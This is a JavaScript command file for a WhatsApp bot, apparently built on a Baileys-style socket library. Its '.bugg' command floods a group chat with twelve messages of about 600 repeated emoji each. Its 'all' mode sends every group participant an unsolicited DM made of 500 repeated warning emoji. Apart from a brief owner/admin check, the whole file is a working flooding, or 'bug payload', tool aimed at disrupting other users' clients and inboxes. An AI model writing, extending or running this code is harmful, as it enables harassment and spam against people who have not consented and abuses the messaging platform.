// commands/bug_group.js
// Send a "bug" payload into the current group chat or multiple messages to all group participants
// Usage: .bugg (sends payloads into the group) OR .bugg all (attempts to DM each participant with payload) 
// WARNING: These commands can be disruptive. Use responsibly (owner/admin only enforced by flag).

module.exports = async function(...args) {
  const sock = args[0];
  const from = args[1];
  const msg = args[2];
  const flag = typeof args[3] === 'boolean' ? args[3] : false;
  const q = typeof args[4] === 'string' ? args[4] : (Array.isArray(args[5]) ? args[5].join(' ') : '');

  if (!flag) return await sock.sendMessage(from, { text: '❌ Owner/Admin only!' }, { quoted: msg });

  // determine mode
  const mode = (q || '').toLowerCase();

  try {
    // fetch group metadata if available
    let metadata = {};
    try {
      if (sock.groupMetadata) metadata = await sock.groupMetadata(from);
      else if (sock.fetchGroupMetadata) metadata = await sock.fetchGroupMetadata(from);
    } catch (e) { /* ignore */ }

    // If mode === 'all', attempt to DM each participant (owner-only action)
    if (mode === 'all') {
      const participants = (metadata && metadata.participants) ? metadata.participants : [];
      await sock.sendMessage(from, { text: `🚨 Sending bug payloads to ${participants.length} participants (DM mode). Use with caution.` }, { quoted: msg });

      for (const p of participants) {
        const target = p.id || p.jid || p.participant;
        if (!target) continue;
        const payload = '⚠️'.repeat(500) + '\nGROUP-BUG DM';
        try {
          await sock.sendMessage(target, { text: payload });
        } catch (e) {
          // ignore
        }
        await new Promise(r => setTimeout(r, 300));
      }

      return await sock.sendMessage(from, { text: '✅ Attempted DM bug payloads to group participants.' }, { quoted: msg });
    }

    // Default: send multiple payload messages into the group chat
    await sock.sendMessage(from, { text: '🚨 Sending group bug payloads into this chat (use only for testing).'}, { quoted: msg });
    const chars = ['💥','🔥','💀','⚰️','🌪️','🌀'];
    for (let i = 0; i < 12; i++) {
      const payload = chars[Math.floor(Math.random()*chars.length)].repeat(600) + `\nGROUP-BUG #${i+1}`;
      try {
        await sock.sendMessage(from, { text: payload });
      } catch (e) {}
      await new Promise(r => setTimeout(r, 500));
    }

    await sock.sendMessage(from, { text: '✅ Group bug payloads sent.' }, { quoted: msg });
  } catch (e) {
    await sock.sendMessage(from, { text: '❌ Error while running group bug: ' + (e && e.message ? e.message : String(e)) }, { quoted: msg });
  }
};
